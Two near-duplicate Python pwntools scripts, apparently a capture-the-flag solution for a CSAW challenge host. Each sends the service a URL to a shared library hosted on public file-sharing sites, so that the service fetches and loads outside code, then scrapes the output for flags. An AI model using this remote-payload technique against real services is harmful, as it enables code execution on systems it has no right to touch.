#!/usr/bin/env python3
from pwn import *
import re, time, socket, subprocess, os

HOST='rev.chal.csaw.io'
PORT=8000
URLS=['https://d.uguu.se/ORZgstzv.so','https://files.catbox.moe/m71mfv.so']
OUT='out.bin'

flag_patterns=[rb'flag\{[^}\n\r]+\}', rb'csaw\{[^}\n\r]+\}']

def resolve_ips(host):
    ips=[]
    try:
        infos=socket.getaddrinfo(host,None)
        for inf in infos:
            ip=inf[4][0]
            if ip not in ips:
                ips.append(ip)
    except Exception:
        pass
    try:
        r=subprocess.check_output(['dig','+short',host],stderr=subprocess.DEVNULL,timeout=10).decode()
        for line in r.splitlines():
            line=line.strip()
            if re.match(r'^[0-9.]+$',line) and line not in ips:
                ips.append(line)
    except Exception:
        pass
    return ips

def try_once(dest_host,url,timeout=120):
    data=b''
    try:
        io=remote(dest_host,PORT,timeout=15)
        io.sendline(url.encode())
        end=time.time()+timeout
        while time.time()<end:
            try:
                chunk=io.recv(timeout=2)
                if not chunk:
                    break
                data+=chunk
            except EOFError:
                break
            except Exception:
                pass
        io.close()
    except Exception as e:
        log.failure(f'connect fail {dest_host}: {e}')
    return data

def extract_flags(data):
    found=[]
    for p in flag_patterns:
        found += re.findall(p,data)
    # broader near "flag"
    for m in re.finditer(rb'flag[^\n\r]{0,200}',data,re.I):
        seg=m.group(0)
        found+=re.findall(rb'\{[^}\n\r]{1,200}\}',seg)
    # unique preserve
    out=[]
    for f in found:
        if f not in out:
            out.append(f)
    return out


def main():
    all_data=b''
    targets=[HOST]+resolve_ips(HOST)
    if not targets:
        targets=[HOST]
    for url in URLS:
        for attempt in range(6):
            for t in targets:
                log.info(f'try url={url} target={t} attempt={attempt}')
                d=try_once(t,url,timeout=120)
                if d:
                    all_data += b'\n=====TRY %s %s=====\n'%(url.encode(),str(t).encode()) + d
                    flags=extract_flags(all_data)
                    if flags:
                        open(OUT,'wb').write(all_data)
                        print('FOUND', [x.decode(errors='ignore') for x in flags])
                        return
            time.sleep(min(2**attempt,20))
    open(OUT,'wb').write(all_data)
    print('NOFLAG')

if __name__=='__main__':
    main()

#!/usr/bin/env python3
from pwn import *
import socket,time,re,requests,sys

HOST='rev.chal.csaw.io'
PORT=8000
URL1='https://d.uguu.se/ORZgstzv.so'
URL2='https://files.catbox.moe/m71mfv.so'


def resolve_candidates(host):
    ips=[]
    # local resolver
    try:
        infos=socket.getaddrinfo(host,None,socket.AF_INET,socket.SOCK_STREAM)
        for x in infos:
            ip=x[4][0]
            if ip not in ips: ips.append(ip)
    except Exception:
        pass
    # dns over https fallback
    for endpoint in [
        f'https://dns.google/resolve?name={host}&type=A',
        f'https://cloudflare-dns.com/dns-query?name={host}&type=A'
    ]:
        try:
            r=requests.get(endpoint,headers={'accept':'application/dns-json'},timeout=10)
            j=r.json()
            for a in j.get('Answer',[]) or []:
                if a.get('type')==1:
                    ip=a.get('data')
                    if ip and ip not in ips: ips.append(ip)
        except Exception:
            pass
    return ips

def attempt(conn_host,url,timeout=120):
    io=remote(conn_host,PORT,timeout=12)
    data=b''
    # banner/prompt
    try:
        data += io.recvuntil(b'>>>',timeout=10)
    except Exception:
        try:
            data += io.recv(timeout=2) or b''
        except Exception:
            pass
    io.sendline(url.encode())
    t_end=time.time()+timeout
    while time.time()<t_end:
        try:
            chunk=io.recv(timeout=2)
            if not chunk:
                break
            data += chunk
        except EOFError:
            break
        except Exception:
            continue
    io.close()
    return data


def extract_flags(blob):
    txt=blob.decode('latin1','ignore')
    pats=[r'flag\{[^}]+\}',r'csaw\{[^}]+\}',r'(?i)(?:flag[^\n]{0,120}?\{[^}]+\})']
    out=[]
    for p in pats:
        out += re.findall(p,txt)
    # unique preserve
    seen=[]
    for x in out:
        if x not in seen: seen.append(x)
    return seen,txt


def run(url,outpath):
    candidates=[HOST]+resolve_candidates(HOST)
    print('[*] candidates',candidates)
    all_data=b''
    for i in range(8):
        h=candidates[i%len(candidates)]
        backoff=min(20,2+i)
        try:
            print(f'[*] try {i+1} host={h} url={url}')
            d=attempt(h,url,timeout=120)
            all_data += b"\n===== ATTEMPT %d host=%s =====\n"%(i+1,str(h).encode())+d
            flags,_=extract_flags(all_data)
            if flags:
                break
        except Exception as e:
            all_data += f"\n[error attempt {i+1} host={h}: {e}]\n".encode()
        time.sleep(backoff)
    open(outpath,'wb').write(all_data)
    return all_data

if __name__=='__main__':
    context.log_level='error'
    blob=run(URL1,'/home/ctfplayer/out.bin')
    flags,txt=extract_flags(blob)
    print('[*] flags1',flags)
    if not flags:
        blob2=run(URL2,'/home/ctfplayer/out2.bin')
        flags,txt=extract_flags(blob2)
        print('[*] flags2',flags)
    print('[*] done')

